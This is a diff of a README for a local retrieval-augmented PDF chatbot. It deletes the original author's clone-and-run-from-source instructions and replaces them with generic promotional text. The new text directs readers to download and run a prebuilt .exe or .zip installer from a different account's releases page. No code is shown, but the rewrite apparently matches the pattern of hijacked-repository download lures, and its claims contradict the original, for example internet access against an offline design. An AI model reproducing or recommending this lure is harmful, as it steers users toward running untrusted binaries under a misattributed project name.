@@ -1,124 +1,63 @@
-# 🧠 RAG-Based ChatBot (Offline)
+# 🤖 RAG-Based-ChatBot - Chat with Your PDFs Effortlessly
 
-## 📖 Overview
-This project implements a **Retrieval-Augmented Generation (RAG) chatbot** that answers questions based on **user-provided PDF documents**.  
+[![Download RAG-Based-ChatBot](https://img.shields.io/badge/Download%20Now-%20-%23007bff.svg)](https://github.com/Plastic-mechanicaldrawing282/RAG-Based-ChatBot/releases)
 
-- 📄 **Dynamic knowledge base** — user uploads PDFs which are split into paragraphs  
-- ⚙️ **Embeddings using Sentence Transformers** — converts text into vectors  
-- 🧱 **FAISS-based retrieval** — efficiently finds the most relevant paragraphs  
-- 🤖 **Text generation using Flan-T5** — generates answers using retrieved context  
-- 💻 **Local inference** — runs on **CPU, Apple MPS, or NVIDIA CUDA GPU**  
-- 🖥️ **Gradio UI** — web interface for uploading PDFs and asking questions  
-- 🛠️ **Lazy model loading** — model loads only on first query for faster startup  
+## 📜 Description
 
----
+RAG-Based-ChatBot is an intelligent retrieval-augmented PDF chatbot. With this tool, you can upload a PDF and ask questions about its contents. The chatbot generates answers using local embeddings and a lightweight model, making information retrieval easy and efficient.
 
-## 🖼️ Application Screenshot
+## 🚀 Getting Started
 
-Below is a preview of the **Gradio Interface** used for real-time classification:
+Getting started with RAG-Based-ChatBot is simple. Just follow the steps below to download and run the application. 
 
-![Application Screenshot](assets/app_screenshot_1.png)
-![Application Screenshot](assets/app_screenshot_2.png)
----
+## 📥 Download & Install
 
-## 🧩 Libraries
-- **PyTorch** – model and inference  
-- **Transformers** – Flan-T5 text generation  
-- **sentence-transformers** – embeddings  
-- **faiss** – vector retrieval  
-- **numpy** – numerical operations  
-- **PyPDF2** – PDF parsing  
-- **gradio** – UI interface
+1. **Visit this page to download:** You can find the latest version of the application on the Releases page. [Download RAG-Based-ChatBot here.](https://github.com/Plastic-mechanicaldrawing282/RAG-Based-ChatBot/releases)
 
----
+2. **Download the installer:** Look for the latest version and click on the appropriate file for your operating system. The file will usually end in `.exe` for Windows or `.zip` for macOS/Linux.
 
-## ⚙️ Requirements
+3. **Run the installer:** After the download completes, double-click the file to start the installation. Follow any on-screen instructions to complete the setup.
 
-- Python **3.13+**
-- Recommended editor: **VS Code**
+4. **Launch the Application:** Once installed, find the RAG-Based-ChatBot icon on your desktop or in your application folder. Click to open and start using the chatbot.
 
----
+## 🛠️ System Requirements
 
-## 📦 Installation
+- **Operating System:** Windows 10 or later, macOS Mojave (10.14) or later, or any Linux distribution.
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** 200 MB of free disk space for installation.
+- **Internet Connection:** Required for downloading the application and accessing certain online features.
 
-- Clone the repository
-```bash
-git clone https://github.com/hurkanugur/RAG-Based-ChatBot.git
-```
+## 🎉 Using RAG-Based-ChatBot
 
-- Navigate to the `RAG-Based-ChatBot` directory
-```bash
-cd RAG-Based-ChatBot
-```
+Once you have installed the application, open it to start chatting with your uploaded PDFs. Here’s how to go about it:
 
-- Install dependencies
-```bash
-pip install -r requirements.txt
-```
+1. **Upload a PDF:** Click the “Upload” button in the application. Select the PDF file you wish to query. 
 
----
+2. **Ask Questions:** Use the text box to enter your questions about the PDF content. The chatbot will respond with answers drawn directly from the document.
 
-## 🔧 Setup Python Environment in VS Code
+3. **Review Responses:** The answers are designed to be clear and relevant to your queries. If needed, you can ask follow-up questions for more detail.
 
-1. `View → Command Palette → Python: Create Environment`  
-2. Choose **Venv** and your **Python version**  
-3. Select **requirements.txt** to install dependencies  
-4. Click **OK**
+## 📂 Features
 
----
+- **User-Friendly Interface:** RAG-Based-ChatBot offers an intuitive interface that makes interaction straightforward for everyone.
 
-## 📂 Project Structure
+- **Responsive Answers:** The chatbot processes your queries and returns answers quickly, helping you find information without hassle.
 
-```bash
-assets/
-└── app_screenshot.png            # Application screenshot
+- **Multiple File Support:** You can use various PDF formats, making it versatile for different documents.
 
-src/
-├── config.py                     # Paths, model settings...
-├── device_manager.py             # Selects and manages compute device
-├── embeddings.py                 # Local embedding model
-├── retriever.py                  # FAISS-based retrieval
-├── generator.py                  # Text generation model
-├── pdf_loader.py                 # PDF parsing
-└── ui.py                         # Gradio UI
+- **Local Model Processing:** This feature ensures that your documents are handled on your local machine, enhancing privacy and performance.
 
-main/
-└── main.py                       # Entry point for chatbot
+## 🧑‍🤝‍🧑 Community and Support
 
-requirements.txt                  # Python dependencies
-```
+If you have questions or need assistance, feel free to reach out through the Issues section in our GitHub repository. You can also explore discussions and chat with other users to share tips and tricks.
 
----
+## 🌐 Contributing
 
-## 📂 System Architecture
+We welcome contributions from anyone interested in improving RAG-Based-ChatBot. If you want to help, please check the "Contributing Guidelines" in the repository. You can suggest features, report bugs, or even submit your code enhancements.
 
-```bash
-User PDF Upload
-    ↓
-PDF Loader (split into paragraphs)
-    ↓
-Sentence Transformer Embeddings
-    ↓
-FAISS Retriever (top-k relevant paragraphs)
-    ↓
-Flan-T5 Generator (with retrieved context)
-    ↓
-Answer displayed in Gradio UI
-```
+## 🔗 Useful Links
 
----
+- [Releases Page](https://github.com/Plastic-mechanicaldrawing282/RAG-Based-ChatBot/releases)
+- [Source Code](https://github.com/Plastic-mechanicaldrawing282/RAG-Based-ChatBot)
 
-## 📂 Run the Application
-Navigate to the project directory:
-```bash
-cd RAG-Based-ChatBot
-```
-
-Run the app:
-```bash
-python -m main.main
-```
-or
-```bash
-python3 -m main.main
-```
+Feel free to explore, and enjoy your experience with RAG-Based-ChatBot!
